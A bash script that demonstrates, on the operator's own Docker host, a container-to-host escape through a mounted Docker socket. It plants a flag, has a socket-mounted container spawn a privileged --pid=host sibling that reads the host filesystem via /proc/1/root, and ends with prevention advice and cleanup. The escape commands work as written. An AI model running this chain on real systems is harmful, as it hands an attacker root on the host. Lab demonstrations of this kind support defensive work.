#!/usr/bin/env bash
# R2 — a REAL container escape (container -> host), unlike R1's intra-container privilege escalation.
#
# Misconfiguration: a container mounts the Docker socket (/var/run/docker.sock). That socket talks
# to the host's dockerd (which runs as root), so a container holding it can command the host to
# spawn a NEW, privileged container with the host's PID namespace — and read the host root
# filesystem through /proc/1/root. Mounting the docker socket is equivalent to giving the container
# root on the host.
#
# Benign: your own Docker host (the Docker Desktop Linux VM), a flag this script plants and removes.
# Nothing here touches macOS itself or any system you don't own.
set -euo pipefail
SOCK="/var/run/docker.sock"
HOSTFILE="/run/dockerhost_flag"          # lives on the Docker HOST (the VM), not in any normal container
IMG="alpine"
FLAG="flag{$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')}"
say(){ printf '\n\033[1;34m========== %s ==========\033[0m\n' "$*"; }

command -v docker >/dev/null || { echo "docker not found"; exit 1; }
docker info >/dev/null 2>&1 || { echo "Docker daemon not running — start Docker Desktop first (open -a Docker)"; exit 1; }
docker pull -q "$IMG" >/dev/null 2>&1 || true
docker pull -q docker:cli >/dev/null 2>&1 || true

say "SETUP — plant a host-only secret on the Docker host (operator with legitimate host access)"
docker run --rm --privileged --pid=host "$IMG" sh -c "echo '$FLAG' > /proc/1/root${HOSTFILE}" \
  && echo "planted ${HOSTFILE} on the host (via a privileged --pid=host container)"

say "CONTROL — a NORMAL container cannot see it (proves it's a HOST file, not a container file)"
docker run --rm "$IMG" sh -c "cat ${HOSTFILE} 2>&1 || echo 'NOT VISIBLE from a normal container (as expected)'"

say "ESCAPE — a container with ONLY the docker socket mounted reaches the host file"
echo "attacker container mounts:  -v ${SOCK}:${SOCK}   (it has NO host mount of its own)"
echo "it then uses the socket to ask the HOST dockerd to spawn a privileged --pid=host sibling:"
echo "  docker run --privileged --pid=host ${IMG} cat /proc/1/root${HOSTFILE}"
RECOVERED="$(docker run --rm -v "${SOCK}:${SOCK}" docker:cli \
  sh -c "docker run --rm --privileged --pid=host ${IMG} cat /proc/1/root${HOSTFILE}" 2>/dev/null | tr -d '\r\n')"
echo "recovered from the host via the socket: ${RECOVERED}"

say "VERDICT"
if [ "$RECOVERED" = "$FLAG" ]; then
  echo "  ✗ CONTAINER ESCAPED: a socket-mounted container read a HOST file (${HOSTFILE}) that a"
  echo "    normal container cannot. Chain:"
  echo "      socket-mounted container --Docker API--> host dockerd (root)"
  echo "        --spawns--> --privileged --pid=host container --> /proc/1/root = host rootfs --> host root."
else
  echo "  escape did not return the flag (recovered='${RECOVERED}') — check Docker socket sharing"
fi

say "PREVENTION"
echo "  - Never mount ${SOCK} into a container — it is equivalent to host root."
echo "  - If a workload must reach Docker, front it with a socket proxy exposing a minimal, read-only API."
echo "  - In k8s: deny (Kyverno/OPA admission) hostPath mounts of the socket or '/', privileged: true,"
echo "    hostPID, and added CAP_SYS_ADMIN. Falco has default rules for 'Docker socket mounted' and"
echo "    'Launch Privileged Container' / 'sensitive mount'."

say "CLEANUP — remove the planted host secret"
docker run --rm --privileged --pid=host "$IMG" rm -f "/proc/1/root${HOSTFILE}" && echo "removed ${HOSTFILE} from the host"
